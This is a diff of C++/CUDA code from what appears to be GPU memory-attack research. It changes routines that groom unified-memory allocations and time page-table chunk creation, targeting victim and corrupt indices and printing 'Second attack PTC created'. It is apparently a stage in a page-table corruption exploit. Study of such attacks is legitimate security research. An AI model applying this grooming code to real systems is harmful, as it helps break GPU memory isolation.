@@ -24,6 +24,7 @@ second_PT_chunk_evict (int argc, char *argv[])
       exit (1);
     }
 
+  std::cout << (void*)first_ptc_ptrs[7390] << '\n';
   std::cout << "Ready to Start Second PTC Test " << '\n';
   std::cin.clear ();
   std::cin.ignore (std::numeric_limits<std::streamsize>::max (), '\n');
@@ -41,23 +42,16 @@ second_PT_chunk_evict (int argc, char *argv[])
     *(first_ptc_ptrs[0] + j) = 'a';
   for (uint64_t i = 1; i < 888; i += 1)
     {
-      /* Normal Freeing */
-            /* Need Space every 512 (2MB / 4KB) */
-      // if (i == 513)
-      //   {
-      //     for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
-      //       *(first_ptc_ptrs[0] + j) = 'a';
-      //   }
-
-
-      // for (int j = 0; j < 2 * 1024 * 1024; j += 64 * 1024)
-      //   *(first_ptc_ptrs[i] + j) = 'a';
-
+      if (i == 887)
+        {
+          for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
+            *(first_ptc_ptrs[7390] + j) = 'a';
+        }
       // Create Free Space
       cudaMallocManaged (&temp, 2 * 1024 * 1024 + 4096);
 
       auto start = std::chrono::high_resolution_clock::now ();
-      initialize_memory<<<1, 1>>> (temp + 2 * 1024 * 1024, 4096);
+      initialize_memory<<<1, 1>>> (temp + 2 * 1024 * 1024, 1);
       cudaDeviceSynchronize ();
       auto end = std::chrono::high_resolution_clock::now ();
 
@@ -66,23 +60,8 @@ second_PT_chunk_evict (int argc, char *argv[])
       double currentMS = duration_evict.count ();
       std::cout << i << " New PT time: " << duration_evict.count () << " ms" << (void*)temp << std::endl;
 
-      // std::cout << i << ' ' << currentMS << std::endl;
-      // std::this_thread::sleep_for(std::chrono::milliseconds(3));
-      // for (int j = 0; j < 2 * 1024 * 1024 - 64 * 1024; j += 64 * 1024)
-        // *(temp + 0) = 'a';
-      // cudaDeviceSynchronize ();
-
       if (i < skip)
         continue;
-
-      // if (currentMS > 0.1)
-      // {
-      //   std::cout << i << ' ' << currentMS  << ' ' << (void*)temp << std::endl;
-      //   std::cout << "Second attack PTC created " << '\n';
-      //   std::cin.clear ();
-      //   std::cin.ignore (std::numeric_limits<std::streamsize>::max (), '\n');
-      //   std::cin >> timein;
-      // }
     }
 
   std::cout << "Second attack PTC created " << '\n';
@@ -122,42 +101,23 @@ second_PT_chunk (uint64_t num_alloc_init, uint64_t num_alloc,
   std::cout << (void *)((uintptr_t)victim_ptr & ~((1UL << 20) - 1)) << '\n';
   std::cout << victim_id << ' ' << corrupt_id << '\n';
 
-  uint64_t i = 0;
-  uint64_t valid_count = 512;
-  for (uint64_t i = 0; i < num_alloc_second + 2; i++)
+  for (int j = 0; j < 2 * 1024 * 1024; j += 64 * 1024)
+    *(first_ptc_ptrs[0] + j) = 'a';
+  for (uint64_t i = 1; i < num_alloc_second; i++)
     {
-      // Skip victim_id and corrupt_id
-      if (i == victim_id || i == corrupt_id)
-        {
-          continue;
-        }
-
-      // Need space every 512 valid allocations
-      if (valid_count == 512)
-        {
-          for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
-            *(first_ptc_ptrs[i] + j) = 'a';
-          i++;
-          valid_count = 0;
-        }
-
-      // Normal allocation work
-      for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
-        *(first_ptc_ptrs[i] + j) = 'a';
-
       // Final write at the end
-      if (i == num_alloc_second + 1)
+      if (i == num_alloc_second - 1)
         {
           for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
             *(first_ptc_ptrs[victim_id] + j) = 'a';
         }
 
-      valid_count++;
+      // valid_count++;
 
       // Create Free Space
       cudaMallocManaged (&temp, 2 * 1024 * 1024 + 4096);
       auto start = std::chrono::high_resolution_clock::now ();
-      initialize_memory<<<1, 1>>> (temp, 2 * 1024 * 1024 + 4096);
+      initialize_memory<<<1, 1>>> (temp + 2 * 1024 * 1024, 1);
       cudaDeviceSynchronize ();
       auto end = std::chrono::high_resolution_clock::now ();
 
@@ -168,31 +128,10 @@ second_PT_chunk (uint64_t num_alloc_init, uint64_t num_alloc,
                 << std::endl;
 
       // Generate Page Table for 64KB Pages.
-      *(temp + 0) = 'a';
+      // *(temp + 0) = 'a';
 
       if (i < skip)
         continue;
-
-      if (minTimeMS == 0)
-        minTimeMS = currentMS;
-      else if (currentMS < minTimeMS)
-        minTimeMS = currentMS;
-      else if (currentMS > minTimeMS + threshold)
-        {
-          std::cout << "\033[1;31m" << "Error!" << "\033[0m" << std::endl;
-          std::cout << "After \033[1;31m" << i
-                    << "\033[0m 2MB Allocations:" << std::endl;
-          std::cout << "Normal Latency: " << minTimeMS
-                    << ", Mem Full Latency: " << duration_evict.count ()
-                    << " ms" << std::endl;
-
-          std::cout << "Second attack PTC created " << '\n';
-          std::cin.clear ();
-          std::cin.ignore (std::numeric_limits<std::streamsize>::max (), '\n');
-          std::cin >> timein;
-
-          return false;
-        }
     }
 
   std::cout << "Second attack PTC created " << '\n';
